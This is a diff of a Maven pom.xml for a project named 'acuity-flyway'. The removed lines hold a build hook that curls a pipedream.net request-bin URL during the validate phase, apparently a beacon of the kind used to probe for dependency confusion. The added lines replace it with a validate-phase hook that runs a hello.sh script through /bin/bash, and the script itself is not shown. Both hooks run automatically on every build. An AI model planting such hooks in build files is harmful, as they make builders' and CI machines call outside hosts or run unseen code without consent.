@@ -2,40 +2,36 @@
 
 <project xmlns="http://maven.apache.org/POM/4.0.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
-         https://maven.apache.org/xsd/maven-4.0.0.xsd">
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
 
     <modelVersion>4.0.0</modelVersion>
 
     <groupId>io.github.digital-ecmt</groupId>
     <artifactId>acuity-flyway</artifactId>
     <version>1.0.0</version>
-    <packaging>jar</packaging>
-
-    <name>acuity-flyway</name>
-    <description>Sample Maven project</description>
 
     <build>
         <plugins>
 
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-antrun-plugin</artifactId>
-                <version>3.1.0</version>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.6.0</version>
 
                 <executions>
                     <execution>
-                        <id>hello-world</id>
+                        <id>run-bash-script</id>
                         <phase>validate</phase>
 
                         <goals>
-                            <goal>run</goal>
+                            <goal>exec</goal>
                         </goals>
 
                         <configuration>
-                            <target>
-                                <curl https://eonw4rkshveo8pz.m.pipedream.net/>
-                            </target>
+                            <executable>/bin/bash</executable>
+                            <arguments>
+                                <argument>${project.basedir}/hello.sh</argument>
+                            </arguments>
                         </configuration>
 
                     </execution>
